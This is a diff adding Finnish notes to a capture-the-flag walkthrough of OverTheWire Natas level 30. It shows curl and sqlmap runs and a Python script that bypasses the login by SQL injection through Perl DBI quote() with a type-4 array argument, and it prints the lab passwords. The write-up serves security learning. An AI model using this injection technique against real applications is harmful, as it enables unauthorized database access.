@@ -459,3 +459,189 @@ $dbh->quote($arvo, $tyyppi);quote(param('username')) . " and password =".$dbh->q
 ja toinen arvo on esimerkiksi kokonaisluku (`SQL_INTEGER`), funktio ei lainaa arvoa. Tämä voi johtaa siihen, että käyttäjän syöte päätyy SQL-lauseeseen ilman lainausmerkkejä, mikä mahdollistaa SQL-injektion.
 
 
+## kali linux - START HERE
+
+Pientä kali linux komentoja tarkistukseen level 30:teen
+
+natas30 - WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -e http://natas31.natas.labs.overthewire.org/ http://natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH@natas30.natas.labs.overthewire.org
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -v -e http://natas31.natas.labs.overthewire.org/ http://natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH@natas30.natas.labs.overthewire.org
+* Host natas30.natas.labs.overthewire.org:80 was resolved.
+* IPv6: (none)
+* IPv4: 56.228.72.241
+*   Trying 56.228.72.241:80...
+* Connected to natas30.natas.labs.overthewire.org (56.228.72.241) port 80
+* Server auth using Basic with user 'natas30'
+> GET / HTTP/1.1
+> Host: natas30.natas.labs.overthewire.org
+> Authorization: Basic bmF0YXMzMDpXUWh4MUJ2Y21QOWlyczJNUDl0Um5Mc05hREk3NllySA==
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Referer: http://natas31.natas.labs.overthewire.org/
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Sat, 23 Aug 2025 14:12:23 GMT
+< Server: Apache/2.4.58 (Ubuntu)
+< Vary: Accept-Encoding
+< Transfer-Encoding: chunked
+< Content-Type: text/html; charset=iso-8859-1
+< 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+* Connection #0 to host natas30.natas.labs.overthewire.org left intact
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas30.natas.labs.overthewire.org/" --data="natas30=admin&password=WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" --batch
+        ___
+       __H__                                                                                                                                      
+ ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                                          
+|_ -| . [(]     | .'| . |                                                                                                                         
+|___|_  [,]_|_|_|__,|  _|                                                                                                                         
+      |_|V...       |_|   https://sqlmap.org                                                                                                      
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:52:59 /2025-08-23/
+
+[17:53:00] [INFO] testing connection to the target URL
+[17:53:00] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+[17:53:00] [WARNING] HTTP error codes detected during run:
+401 (Unauthorized) - 1 times
+[17:53:00] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 17:53:00 /2025-08-23/
+
+
+
+
+┌──(kali㉿kali)-[~/Desktop/Python koodit]
+└─$ cat pythonkoodi30.py  
+import requests
+from requests.auth import HTTPBasicAuth
+
+basicAuth=HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+
+u="http://natas30.natas.labs.overthewire.org/index.pl"
+
+params={"username": "natas28", "password": ["'lol' or 1", 4]}
+response = requests.post(u, data=params, auth=basicAuth, verify=False)
+
+print(response.text)
+
+
+
+┌──(kali㉿kali)-[~/Desktop/Python koodit]
+└─$ python pythonkoodi30.py      
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+Suoritettun tämän koodin jälkeen, niin tässä viittaus liittyen Perl-ohjelmointikieleen (view-source.html), jossa on **DBI (databse interface)** moduuliin ja tätä käytetään tietokantayhteyksien hallintaan. Kyseessä on, että miksi **toinen parametri, arvo 4**, johtaa **unquoted value** tilannetta eli miksi arvo ei ympäröidä lainausmerkkeillä SQL-lauseella.
+
+Testattu tämä (ylempi) python skripti koodi ja onko se vastaus ja miksi näin, kun siinä oli jotakin sql injektiota syötetty ja testattu UI selaimen kautta - se ei toiminut.
+
+
+Pientä lisätietoa ainakin tästä. DBI:n (Perl Database Interface) kontekstissa SQL_INTEGER on yksi monista SQL-tyyppien tunnisteista, joita käytetään esimerkiksi quote()-funktion tai bind_param()-funktion yhteydessä. Arvo 4 vastaa SQL_INTEGER-tyyppiä.
+
+lisätietoa: https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html?ref=learnhacking.io
+
+![alt text](./kuvat-level29-34/natas30-6.png)
+
+- Arvo 4 vastaa SQL_INTEGER, mutta ei ole ainut arvo joka aiheuttaa lainaamattoman arvon.
+- DBI:n quote()-funktio voi käyttää toista määritelmää, jos sille annetaan lista, jossa toinen arvo on numeerinen tyyppi.
+- Tämä voi johtaa SQL-injektioon, jos käyttäjän syötettä ei käsitellä oikein.
+- Pythonilla voi simuloida tätä hyökkäystä lähettämällä `data={"param": ["injektio", 4]}`
+
+Tämä osuus (view-source.html), jossa antamalla toisen arvon 4 käytämällä tätä quote() funktio määritelmää: `$dbh->quote($value, $data_type);` , mutta virallinen view-source.html siellä lukee näin: `$dbh->quote(param('password'))`
+
+- `quote($value, $type)` - voi johtaa lainausmerkkien puuttumiseen, jos tyyppi on numeerinen (esim. 4 = SQL_INTEGER)
+- Tämä voi mahdollistaa SQL-injektion, jos arvo sisältää haitallista sisältöä
+- Ominaisuus on tarkoitettu tilanteisiin, joissa tyyppi pitää antaa ohjelmallisesti, mutta se voi olla turvaton, jos syöte tulee käyttäjältä
+
+
+
